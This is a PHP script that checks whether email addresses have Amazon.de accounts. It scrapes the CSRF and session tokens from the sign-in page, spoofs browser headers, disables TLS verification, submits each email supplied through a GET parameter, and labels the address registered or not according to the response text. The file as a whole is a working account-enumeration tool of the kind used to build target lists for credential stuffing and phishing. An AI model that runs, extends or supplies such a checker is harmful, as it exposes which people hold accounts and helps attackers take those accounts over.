<?php

function getHiddenInputValues($html)
{
    $result = [];

    libxml_use_internal_errors(true);
    $dom = new DOMDocument();
    $dom->loadHTML($html);

    $xpath = new DOMXPath($dom);
    $inputs = $xpath->query('//input[@type="hidden"]');

    foreach ($inputs as $input) {
        $name  = $input->getAttribute('name');
        $value = $input->getAttribute('value');

        if (!empty($name)) {
            $result[$name] = $value;
        }
    }

    return $result;
}


function fetchAmazonHiddenInputs($url)
{
    $cookieFile = __DIR__ . '/cookie.txt';

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_ENCODING => '',
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,

        // penting untuk amazon
        CURLOPT_COOKIEJAR  => $cookieFile,
        CURLOPT_COOKIEFILE => $cookieFile,

        CURLOPT_HTTPHEADER => [
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language: en-GB,en;q=0.9',
        ],
    ]);

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        throw new Exception('Curl Error: ' . curl_error($ch));
    }

    curl_close($ch);

    return getHiddenInputValues($response);
}

$url = "https://www.amazon.de/ap/signin?openid.return_to=https%3A%2F%2Fpayments.amazon.de%2Fcheckout%2Finitiate_auth%3Fwid%3D6dbb5722-baa4-47f8-ac30-d16bec2f1e26&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=amzn_pyop_de&openid.mode=checkid_setup&siteState=buyer_language%3Den_GB%26coe%3DDE%26combined_page%3Dtrue%26env%3DLIVE%26estimated_order_amount%3D%257B%2522amount%2522%253A%252250.38%2522%252C%2522currencyCode%2522%253A%2522EUR%2522%257D%26ledger_currency%3DEUR%26origin_url%3Dhttps%253A%252F%252Fwww.dashcam-shop.com%252FVIOFO-A119-Mini-2-GPS-Mount%26product_type%3DPAY_AND_SHIP%26referrer_url%3Dhttps%253A%252F%252Fwww.dashcam-shop.com%252FVIOFO-A119-Mini-2-GPS-Mount%26show_otp_text%3Dfalse%26wid%3D6dbb5722-baa4-47f8-ac30-d16bec2f1e26&marketPlaceId=A53RDEWN57UU5&language=en_GB&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=amzn_pay_eu_mergeSignInAndLegalConsent&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&&openid.pape.max_auth_age=0"; // URL lengkap kamu

$hiddenInputs = fetchAmazonHiddenInputs($url);

$email = $_GET['email'];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.de/ap/signin');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'accept-language: en-US,en;q=0.9',
    'cache-control: max-age=0',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://www.amazon.de',
    'priority: u=0, i',
    'referer: '.$url,
    'sec-ch-ua: "Not:A-Brand";v="99", "Brave";v="145", "Chromium";v="145"',
    'sec-ch-ua-full-version-list: "Not:A-Brand";v="99.0.0.0", "Brave";v="145.0.0.0", "Chromium";v="145.0.0.0"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-ch-ua-platform-version: "19.0.0"',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'sec-gpc: 1',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
]);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'appActionToken='.urlencode($hiddenInputs['appActionToken']).'&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&siteState='.urlencode($hiddenInputs['siteState']).'&openid.return_to='.urlencode($hiddenInputs['openid.return_to']).'&prevRID='.urlencode($hiddenInputs['prevRID']).'&workflowState='.urlencode($hiddenInputs['workflowState']).'&anti-csrftoken-a2z='.urlencode($hiddenInputs['anti-csrftoken-a2z']).'&email='.urlencode($email).'&password=&create=0&metadata1=');

$response = curl_exec($ch);

curl_close($ch);

header('Content-Type: application/json');

$result = [];

if (strpos($response, "We cannot find an account with that e-mail address") !== false) {

    $result = [
        "email"  => $email,
        "status" => "invalid",
        "message"=> "Email not registered"
    ];

} elseif (strpos($response, "Password") !== false) {

    $result = [
        "email"  => $email,
        "status" => "valid",
        "message"=> "Email Registered"
    ];

} else {

    $result = [
        "email"  => $email,
        "status" => "unknown",
        "message"=> "Email Unknown"
    ];
}

echo json_encode($result, JSON_PRETTY_PRINT);
exit;
